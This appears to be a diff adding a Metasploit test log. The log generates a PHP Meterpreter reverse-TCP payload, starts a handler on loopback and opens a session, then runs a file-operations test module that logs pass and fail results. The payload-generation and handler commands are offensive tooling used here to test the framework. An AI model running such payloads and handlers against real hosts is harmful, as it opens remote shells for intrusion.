@@ -1,0 +1,34 @@
+use php/meterpreter_reverse_tcp
+generate -o /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3365-2ovk77.php -f raw lport=6025 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34276 bytes to /tmp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220119-3365-2ovk77.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 24
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6025 
+[*] Meterpreter session 25 opened (127.0.0.1:6025 -> 127.0.0.1:56266 ) at 2022-01-19 10:34:27 +0000
+use test/file
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> run session=25 addentropy=true verbose=true
+
+[*] Setup: changing working directory to /tmp
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_railgun_api
+[*] Running against session 25
+[*] Session type is meterpreter and platform is linux
+[+] should test for file existence
+[+] should create text files
+[+] should read the text we just wrote
+[+] should append text files
+[+] should delete text files
+[+] should move files
+[+] should test for directory existence
+[*] Creating directory test-dir
+[*] test-dir created
+[*] Creating directory test-dir/directory
+[*] test-dir/directory created
+[+] should create directories
+[+] should list the directory we just made
+[-] FAILED: should recursively delete the directory we just made
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_delete_dir: Operation failed: 1
+[*] Creating directory test-dir
+[*] 127.0.0.1 - Meterpreter session 25 closed.  Reason: Died
